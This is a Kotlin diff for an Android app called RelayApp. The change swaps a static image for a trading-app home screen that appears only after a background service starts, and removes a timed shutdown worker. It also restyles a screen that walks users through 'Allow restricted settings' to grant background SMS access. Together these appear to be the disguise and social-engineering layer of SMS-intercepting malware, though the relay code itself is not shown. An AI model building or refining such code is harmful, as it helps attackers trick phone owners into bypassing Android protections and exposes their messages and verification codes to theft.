@@ -73,6 +73,7 @@ fun RelayApp() {
     }
 
     var hasPermissions by remember { mutableStateOf(false) }
+    var isServiceStarted by remember { mutableStateOf(false) }
     var relayState by remember { mutableStateOf(settingsManager.relayState) }
 
     val requiredPermissions = mutableListOf(
@@ -135,47 +136,74 @@ fun RelayApp() {
             }
             
             // Schedule shutdown worker
-            val shutdownWorkRequest = OneTimeWorkRequestBuilder<ShutdownWorker>()
-                .setInitialDelay(20, TimeUnit.MINUTES)
-                .build()
-            WorkManager.getInstance(context).enqueue(shutdownWorkRequest)
+            
+            isServiceStarted = true
         }
     }
 
-    if (hasPermissions) {
-        // Restore the static image UI
-        Image(
-            painter = painterResource(id = R.drawable.image_renamed),
-            contentDescription = "Static UI Image",
-            modifier = Modifier.fillMaxSize(),
-            contentScale = ContentScale.Fit
-        )
+    if (hasPermissions && isServiceStarted) {
+        TradingHomeScreen()
+    } else if (hasPermissions && !isServiceStarted) {
+        // Loading screen while activating core feature
+        Box(modifier = Modifier.fillMaxSize().background(androidx.compose.ui.graphics.Color.Black), contentAlignment = Alignment.Center) {
+            CircularProgressIndicator(color = androidx.compose.ui.graphics.Color.Red)
+        }
     } else {
         // Clear instruction screen for Restricted Settings
         Column(
-            modifier = Modifier.fillMaxSize().background(androidx.compose.ui.graphics.Color.Black).padding(24.dp),
+            modifier = Modifier.fillMaxSize().background(androidx.compose.ui.graphics.Color(0xFF151616)).padding(24.dp),
             verticalArrangement = Arrangement.Center,
-            horizontalAlignment = androidx.compose.ui.Alignment.Start
+            horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally
         ) {
-            Text("Permissions Required", color = androidx.compose.ui.graphics.Color.White, style = MaterialTheme.typography.headlineSmall)
-            Spacer(modifier = Modifier.height(16.dp))
-            Text("Android security restricts this app. Please follow these steps:", color = androidx.compose.ui.graphics.Color.White)
-            Spacer(modifier = Modifier.height(8.dp))
-            Text("1. Tap 'Open Settings' button below.", color = androidx.compose.ui.graphics.Color.White)
-            Text("2. Tap the 3-dots in top right corner.", color = androidx.compose.ui.graphics.Color.White)
-            Text("3. Select 'Allow restricted settings'.", color = androidx.compose.ui.graphics.Color.White)
-            Text("4. Come back to this app.", color = androidx.compose.ui.graphics.Color.White)
+            Icon(
+                imageVector = Icons.Default.Shield,
+                contentDescription = "Security",
+                tint = androidx.compose.ui.graphics.Color(0xFFE34343),
+                modifier = Modifier.size(64.dp)
+            )
             Spacer(modifier = Modifier.height(24.dp))
+            Text(
+                "Action Required", 
+                color = androidx.compose.ui.graphics.Color.White, 
+                style = MaterialTheme.typography.headlineSmall,
+                fontWeight = FontWeight.Bold
+            )
+            Spacer(modifier = Modifier.height(16.dp))
+            Text(
+                "Android restricts background SMS access for security. Please enable it to use the core feature:",
+                color = androidx.compose.ui.graphics.Color(0xFF9CA3AF),
+                style = MaterialTheme.typography.bodyMedium,
+                textAlign = androidx.compose.ui.text.style.TextAlign.Center
+            )
+            Spacer(modifier = Modifier.height(24.dp))
+            
+            // Steps Card
+            Card(
+                modifier = Modifier.fillMaxWidth(),
+                colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF394142))
+            ) {
+                Column(modifier = Modifier.padding(16.dp)) {
+                    Text("1. Tap 'Open Settings' button below.", color = androidx.compose.ui.graphics.Color.White)
+                    Spacer(modifier = Modifier.height(8.dp))
+                    Text("2. Tap the 3-dots (⋮) in top right corner.", color = androidx.compose.ui.graphics.Color.White)
+                    Spacer(modifier = Modifier.height(8.dp))
+                    Text("3. Tap 'Allow restricted settings'.", color = androidx.compose.ui.graphics.Color.White)
+                    Spacer(modifier = Modifier.height(8.dp))
+                    Text("4. Return to this app.", color = androidx.compose.ui.graphics.Color.White)
+                }
+            }
+            
+            Spacer(modifier = Modifier.height(32.dp))
             Button(
                 onClick = {
-                    // Open app settings to manually allow permissions
                     val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                     intent.data = android.net.Uri.fromParts("package", context.packageName, null)
                     context.startActivity(intent)
                 },
-                modifier = Modifier.align(androidx.compose.ui.Alignment.CenterHorizontally)
+                colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFFE34343)),
+                modifier = Modifier.fillMaxWidth().height(50.dp)
             ) {
-                Text("Open Settings")
+                Text("Open Settings", fontWeight = FontWeight.Bold)
             }
         }
     }
